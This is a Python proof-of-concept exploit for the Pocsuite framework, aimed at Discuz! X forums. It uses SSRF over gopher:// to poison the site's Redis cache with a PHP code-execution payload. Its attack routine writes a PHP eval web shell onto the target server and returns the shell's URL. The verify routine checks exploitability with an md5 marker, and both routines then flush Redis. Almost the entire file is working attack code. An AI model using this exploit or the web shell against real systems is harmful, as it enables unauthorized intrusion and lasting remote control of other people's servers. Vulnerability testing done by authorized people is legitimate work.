#!/usr/bin/env python
# coding: utf-8

import string
import random
import hashlib
import base64
import urlparse

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '91879'  # ssvid
    version = '1.0'
    author = ['p0wd3r']
    vulDate = '2016-05-30'
    createDate = '2016-06-19'
    updateDate = '2016-06-19'
    references = ['http://mp.weixin.qq.com/s?__biz=MzI0NjQxODg0Ng==&mid=2247483798&idx=1&sn=65cdf852dffd63b9d4ec41c31d9a5365']
    name = 'Discuz!利用SSRF+缓存应用代码执行'
    appPowerLink = 'http://www.discuz.net'
    appName = 'Discuz!'
    appVersion = 'X'
    vulType = 'Code Execution'
    desc = '''
        Discuz!利用SSRF+缓存应用代码执行
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        result = {}
        payload = ('gopher://127.0.0.1:6379/'
                   '_eval "local t=redis.call(\'keys\',\'*_setting\');'
                   'for i,v in ipairs(t) do redis.call(\'set\',v,'
                   '\'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";'
                   'a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";'
                   's:5:\\\"/^./e\\\";}s:7:\\\"replace\\\";'
                   'a:1:{s:7:\\\"plugins\\\";s:32:\\\"system(base64_decode($_GET[c]));\\\";}}}'
                   's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'
                   ' end;return 1;" 0 %250D%250Aquit')
        vul_url = self.url + payload
        req.get(vul_url)

        web_url = self.url.rpartition('/')
        while web_url[2] != urlparse.urlparse(self.url).netloc:
            shell_url = web_url[0] + '/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
            rep = req.get(shell_url)

            if rep.status_code == 200:

                # 该文件作为一句话的话payload会被拦截，且flush后shell会掉，所以用命令马向当前目录写入一句话
                flag = ''.join([random.choice(string.digits) for _ in range(8)])
                shell_flag = ''.join([random.choice(string.lowercase) for _ in range(8)])
                shell_payload = 'echo \'<?php @eval($_POST[c]);echo "' + flag + '";?>\' > ' + shell_flag + '.php'
                shell_payload_b64 = base64.b64encode(shell_payload)
                req.get(shell_url + '&c=' + shell_payload_b64)

                shell_url = web_url[0] + '/' + shell_flag + '.php'
                rep = req.get(shell_url)
                if rep.status_code == 200 and flag in rep.content:
                    result['ShellInfo'] = {}
                    result['ShellInfo']['URL'] = shell_url
                    result['ShellInfo']['Content'] = '@eval($_POST[c]);'

                # 验证后恢复，避免网站无法访问
                payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
                recover_url = self.url + payload_flush
                req.get(recover_url)
                req.get(web_url[0] + '/forum.php')

                break

            web_url = web_url[0].rpartition('/')

        return self.parse_output(result)

    def _verify(self):
        result = {}
        #Write your code here
        flag = ''.join([random.choice(string.digits) for _ in range(8)])
        payload = ('gopher://127.0.0.1:6379/'
                   '_eval "local t=redis.call(\'keys\',\'*_setting\');'
                   'for i,v in ipairs(t) do redis.call(\'set\',v,'
                   '\'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";'
                   'a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";'
                   's:5:\\\"/^./e\\\";}s:7:\\\"replace\\\";'
                   'a:1:{s:7:\\\"plugins\\\";s:14:\\\"md5(' + flag + ');\\\";}}}'
                   's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'
                   ' end;return 1;" 0 %250D%250Aquit')
        vul_url = self.url + payload
        req.get(vul_url)

        web_url = self.url.rpartition('/')
        while web_url[2] != urlparse.urlparse(self.url).netloc:
            poc_url = web_url[0] + '/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
            rep = req.get(poc_url)
            flag_hash = hashlib.md5(flag).hexdigest()

            if flag_hash in rep.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = poc_url

                # 验证后恢复，避免网站无法访问
                payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
                recover_url = self.url + payload_flush
                req.get(recover_url)
                req.get(web_url[0] + '/forum.php')

                break

            web_url = web_url[0].rpartition('/')

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
